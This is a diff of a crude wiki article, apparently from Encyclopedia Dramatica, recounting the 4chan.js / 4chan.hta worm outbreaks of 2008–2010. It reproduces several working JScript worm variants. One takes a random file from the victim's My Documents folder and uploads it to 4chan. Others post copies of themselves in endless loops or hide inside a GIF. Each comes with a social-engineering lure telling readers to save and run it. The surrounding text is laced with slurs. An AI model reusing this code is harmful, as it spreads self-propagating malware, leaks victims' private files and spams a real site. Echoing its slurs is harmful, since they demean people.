+                    comment[i+1] = tmp;
+                }
+            }
+            comment = comment.join("");
+            comment = comment.replace("\n", "\r\n");
+
+            // Set thread to post to and name of file
+            var thread = getthread(board, 0);
+            var filename = (new Date().getTime() - Math.floor(Math.random()*1e10)) + ".jpg";
+
+            // Add message to image
+            try {
+                imc.saveToFile("imconvert.exe", 2);
+            } catch(e) {}
+            shell.run("imconvert.exe jpeg:part4 -pointsize 36 label:\"Save as\\n4chan.hta\\nShit bricks\" -composite jpeg:part2", 0, 1);
+
+            // Set URL to post to
+            request.open("post", "http://" + dom2[board] + ".4chan.org/" + dir[board] + "/imgboard.php", 0);
+
+            // Set headers
+            var bdry = randomstring(20);
+            request.setRequestHeader("Referer", "http://" + dom1[board] + ".4chan.org/" + dir[board] + "/res/" + thread + ".html");
+            request.setRequestHeader("Accept-Language", "en-us");
+            request.setRequestHeader("Content-Type", "multipart/form-data; boundary=" + bdry);
+
+            // Get document from My Documents
+            var docname = "";
+            var docsize = 0;
+            try {
+                var docpath = shell.regRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\Personal");
+                var doclist = fs.getFolder(docpath).files;
+                if (doclist.count) {
+                    var en = new Enumerator(doclist);
+                    var n = Math.floor(doclist.count * Math.random());
+                    for (var i = 0; i < n; i++) {
+                        en.moveNext();
+                    }
+                    var nm = docpath + "\\" + en.item().name;
+                    if (!(fs.getFile(nm).attributes & 2)) {
+                        docname = nm;
+                        docsize = fs.getFile(docname).size;
+                    }
+                }
+            } catch(e) {}
+
+            // Create non-binary parts of POST data
+            var head = "--" + bdry + "\r\nContent-Disposition: form-data; name=\"";
+
+            var part1 = head + "MAX_FILE_SIZE\"\r\n\r\n" + (mfs[board]*1048576) + "\r\n"
+                + head + "resto\"\r\n\r\n" + thread + "\r\n"
+                + head + "name\"\r\n\r\n\r\n"
+                + head + "email\"\r\n\r\nnoko\r\n"
+                + head + "sub\"\r\n\r\n\r\n"
+                + head + "com\"\r\n\r\n" + comment + "\r\n"
+                + head + "upfile\"; filename=\"" + filename + "\"\r\nContent-Type: image/jpeg\r\n\r\n";
+            var part1f = fs.openTextFile("part1", 2, 1);
+            part1f.write(part1);
+            part1f.close();
+
+            var part3 = scripttext + randomstring(100) + "\r\n";
+            if (docname != "") {
+                part3 += docname + "\r\nBytes: " + docsize + "\r\n";
+            }
+            var part3f = fs.openTextFile("part3", 2, 1);
+            var n = 100 + Math.floor(100 * Math.random());
+            for (var i = 0; i < n; i++) part3f.write(randomstring(1000));
+            part3f.write(part3);
+            var n = 100 + Math.floor(100 * Math.random());
+            for (var i = 0; i < n; i++) part3f.write(randomstring(1000));
+            part3f.close();
+
+            var part5 = "\r\n"
+                + head + "pwd\"\r\n\r\n" + randomstring(8) + "\r\n"
+                + head + "mode\"\r\n\r\nregist\r\n"
+                + "--" + bdry + "--\r\n";
+            var part5f = fs.openTextFile("part5", 2, 1);
+            part5f.write(part5);
+            part5f.close();
+
+            // Check that all parts exist
+            if (!fs.fileExists("part1") || !fs.fileExists("part2") || !fs.fileExists("part3") || !fs.fileExists("part4") || !fs.fileExists("part5")) {
+                throw("");
+            }
+
+            // Combine parts and read in
+            shell.run("cmd /c copy /b part1 + part2 + part3" + ((docname=="")?(""):(" + \""+docname+"\"")) + " + part4 + part5 all", 0, 1);
+            var stream = new ActiveXObject("Adodb.Stream");
+            stream.mode = 3;
+            stream.type = 1;
+            stream.open();
+            stream.loadFromFile("all");
+
+            // Delete files produced
+            cleanup();
+
+            // Post file
+            request.send(stream);
+
+            // Wait until another can be posted
+            WSH.sleep( 45000 + Math.floor(15000 * Math.random()) );
+
+        } catch(e) {
+            cleanup();
+        }
+    }
+}
+
+//</script></pre>|0}}
+
+==4CHAN.JS EPISODE V: THE AIDS STRIKES BACK==
+On 27th October, 4chan.js strikes again.
+
+Some of the [[Faggot|faggots]] who browse /b/ became angry at the other faggots who browse [[B|/b/]] too, and they decided to get some [[lulz|sweet revenge by reviving the script]].
+
+Until then,
+Paste the following to notepad, then save it as "4chan.js", open and shit bricks.
+{{cs|SectionSeven|Again?|<pre>
+fso=WSH.createobject("Scripting.filesystemobject")
+file=fso.opentextfile(WSH.scriptname)
+c='Paste the foll\xadowing to not\xadepad, then sa\xadve it as "4chan.js", open and sh\xadit bricks.\n\n'
+c+=file.readall()
+file.close()
+x=WSH.createobject("msxml2.xmlhttp")
+while(1){
+try{
+x.open("get","ht\x74p\x3a//img.4chan.or"+
+"g/b/?"+Math.ceil(Math.random()*1e15),0)
+x.send()
+t=x.responsetext.match(/<span id="nothread\d+/g)
+t=t[Math.floor(Math.random()*t.length)].match(/\d+/g)[0]
+s="\n--iiiiiiiiiiiiiiiiiiiii\ncont"+
+"ent-disposition:form-data;name="
+s=s+"resto\n\n"+t+s+"com\n\n"+c+s+"mode\n\nregist"
+x.open("post","ht\x74p\x3a//dat.4ch"+
+"an.org/b/imgboard.php",0)
+x.setrequestheader("Content-type","multip"+
+"art/form-data;boundary=iiiiiiiiiiiiiiiiiiiii")
+x.send(s)
+}catch(jjjjjjjjjj){}
+WSH.sleep(30333)
+}
+</pre>//|0}}
+
+==4chan.js: The [[final_solution|final]] version==
+[[Image:JSbot.gif|thumb|right|An [[drawfag|artist's]] depiction of what happened.]]
+This is it. [[Epic Win|All boards are affected this time]]. As of the November 6 2008, the script has come back, and it has brought its friends with it.
+
+[[Image:b- masive lockdown.png|thumb|right|[[Pool's closed|/b/ is closed due to fail]]]]
+
+All boards are affected at the moment, even [[r9k|/r9gay/]]. The [[retard|population]] of 4chan is doomed. In a [[trying too hard|desperate attempt]] to stop the flood [[m00t]] and his troop of modfags [[DELETE FUCKING EVERYTHING|locked down and 404'd all threads in /b/]], and mercilessly b&hammered everyone who [[newfag|was suspect of running the script]]. Attempts to make new threads resulted in a [[Divide By Zero|"Flood detected"]] error. Rejoice my /b/retheren, because [[Catnarok]] is nigh.
+
+===Gaze at its [[Pain_series|beauty]]===
+[[Image:4chanjs reloaded.jpg|center|600px|]]
+
+==lol.js is now a virus==
+Since the last major incident, there have been localized, small occasions of the script on /b/. However, on November 27 2008, [[A_Challenger_Appears|another new version of the script appeared]]. Only this time, the script is an actual virus. Upon execution, it downloads another copy of the file from Rapidshare, and automatically runs it, and then spams /b/. More instances = higher dosage.
+
+==Ad Nauseam==
+January 23, 2009. Attacks continue in the form of a yellow box.
+February 1, 2009 /a/ was attacked by the colorful squares once again.
+
+<gallery>
+Image:4chandotjse-jan-23-09.jpg|Because /b/ always give great advice, rite guys?
+Image:Exploitablevirus.jpg|OH EXPLOITABLE
+Image:Shambox.png|[[Shamwow|You followin' me camera guy?]]
+</gallery>
+
+
+==robot9000 owned==
+On February 2, 2009, leaving other boards alone, the script launched an attack in robot9000, morphing its virus on upload each time to bypass robot9000's image filter.  This was truly an epic win, except for its failure to include the phrase "mootblox" when it dodged robot9000's mute.
+[[Image:4chan js invaded r9k.png|800px|none]]
+
+==/b/ and other boards got BOXxed==
+February 2-5, 2009, now other boards are also the victim of those random color boxes. <s>It are low aimed attacks, but 'we' are still seeing them now and them.</s> Disregard I sucks cocks, Who knows when it will stop? The Red boxes of faggotry took over /b/ for the total of two days many were unable to even keep a tits thread going as it was even overwhelmed by the red boxes of death.
+
+[[Image:Red box day.jpg|thumb|right|The Day the /b/ stood still.]]
+
+{{cs|SectionSeven|The Most Recent Strain |<pre>
+      function f(){
+
+	x=WSH.createobject("msxml2.xmlhttp")
+	fso=WSH.createobject("scripting.filesystemobject")
+	enc=WSH.createobject("scripting.encoder")
+	a="abcdefghijklmnopqrstuvwxyz".split("")
+
+	function rs(){str="";n=10+Math.random()*10;for(i=0;i<n;i++)str+=a[Math.floor(Math.random()*a.length)];return str}
+	function rn(){str="";n=3+Math.random()*7;for(i=0;i<n;i++)str+=Math.floor(Math.random()*10)+"";return str}
+
+	while(1){
+		c=rs()+"\n\nOpen this image (ignore the error), save it as "+WSH.scriptname+", open the file you saved and shit bricks."
+		gif="GIF89a=\t'\t\xf0\x01\x01\xff\x01\x01\xff\x01\x01,\x01\x01\x01\x01\x01\x01\x01\x01\x01\x08"+rs()+"'|"+rn()+"\n"
+		jse=enc.encodescriptfile(".js",f.toString()+"f()",0,"")
+		fn=fso.getspecialfolder(2)+"\\"+rn()+".txt"
+		b=rs()
+		s="\r\n--"+b+"\r\ncontent-disposition:form-data;name="
+		s=s+"upfile;filename=gayness.gif\r\n\r\n"+gif+jse+s+"com\r\n\r\n"+c+s+"mode\r\n\r\nregist"
+
+		var file=fso.createtextfile(fn)
+
+		file.write(s)
+		file.close()
+
+		var z=WSH.createobject("adodb.stream")
+		z.mode=3;
+		z.type=1;
+		z.open();
+		z.loadfromfile(fn)
+
+		x.open("post","http://dat.4chan.org/b/imgboard.php",0)
+		x.setrequestheader("content-type","multipart/form-data;boundary="+b)
+		x.send(z)
+		z.close()
+		WSH.sleep(120000+Math.ceil(Math.random()*60000))</pre>|0}}
+
+==It returns, again==
+On [[Caturday|Caturday]], Febuary, 2009, 4Chan.js returned to [[rape|rape]] /b/. This time images told instructions on how to get to the secret raid board, /z/. The ensuing spamfest pwned /b/ so badly, any there who were not [[fucktards|fucktarded]] escaped to /x/, where they began fucking the hell out of /x/. The mods used their [[banhammered|banhammer]] on all running the script, and /b/ went back to normal once more.
+
+==And Again==
+On April 14th, 2009 the same version of 4chan.js plagued /b/ with the same message asking all the newfags to take a break from [[DESU|DESU]] spamming and [[copypasta|copypasta]] to save the code and run it to shit brix, thus Resulting in [[rage|rage]] amongst [[b|/b/]].
+
+==...And Again==
+In the Junetime, sometime [[last Thursday]], 4chan.js returned with its new mutation of script whereby it would pull a random photo from your hard drive, attach the script to it so you could open it in notepad and [[shit brix]], and posted it to 4chan, but removing intravenous letters from the post, making endless variations on "Open this file in notepad, and prepare to shit brix," thus bypassing wordfilters and imagefilters. Some say the mods just gave up by this point, because there were other colored boxes, sans script being posted by [[anontalk|faggot]] with a failed attempt at DDOSing 4chan, and also the mods were too busy vigorously fapping to the recent outbreak of faggot threads to care.
+
+==Yet Again, it's back==
+[[Image:GreyBoxProbably.png|thumb|right|They never learn]]
+On September 22nd, 2009, another version was made with gray boxes. Newfags who ran the .js were banned around 5 hours afterwards. Three days later, on September 25th, 2009, this happened again, though the boxes were two shades of brown, and unlike the attack beforehand this one hit multiple boards, covering /d/,/wg/,/r9k/,/x/ and every other board nobody cares about. [[fail|Unsuccessful counter offensives]] were mounted by a combined effort of the [[Epic Fail Guy|Epic Fail Army]] and the rest of 4chan, but only served [[Your resistance only makes my penis harder!|to make moar newfags download it]].
+
+By the next day, the site was mostly unspammed and newfags were b& for their faggotry ([[and nothing of value was lost]]).
+
+==2010 edition==
+And Brownbox has made a comeback yet again as "4chan.hta"
+
+This time the spammers are getting smart. They are choosing random images posted by real people and putting "save as 4chan.hta Shit brix" on the corner of the image. Then the bot takes the text from a different post and puts it with the image. As more and more [[Retard|retards]] actually save the images as .HTA, this happens more and more. Soon enough, the bots are able to hold a conversation made up of different random posts on a certain board, which really isn't that different from the regular threads.
+
+[[bitches don't know|N00bs don't know]] it's a brown box and download the file. The problem? A .HTA is always a "trusted program" by [[microsoft]]. This means the faggots are leaving themselevs [[goatse|wide open]] for anything the program will do.
+
+This combined with the previous [[Diochan]] spam has lead to even more cancer/chemo than usual.
+
+A few days later, the script came back [[Cornelia|along with its own personality]].
+
+==See Also==
+*[[Epic_win|Epic Win]]
+*[[Cancer]]
+*[[The Chemo That Is Curing /b/]]
+*[[Newfag]]
+*[[Copypasta]]
+*[[4chan]]
+*[[AIDS]]
+*[[The great ImageFap troll]]
+*[[The xchan effect]]
+*[[Computer Science III]]
+*[[Cornelia]]
+
+{{memes}}
+{{4chan}}
+
+{{timeline|Featured article June 17, [[2008]]|[[PROJECT CHANOLOGY/OPERATION SEA ARRRGH|OPERATION SEA ARRRGH]]|[[4chan.js]]|[[Dylan Thomas]]}}
+{{Timeline|Featured article August 13, [[2009]]|[[Ulrichthehedgehog]]|{{PAGENAME}}|[[Cary Goulston]]}}
+[[Category:2008]]
+[[Category:Chans]]
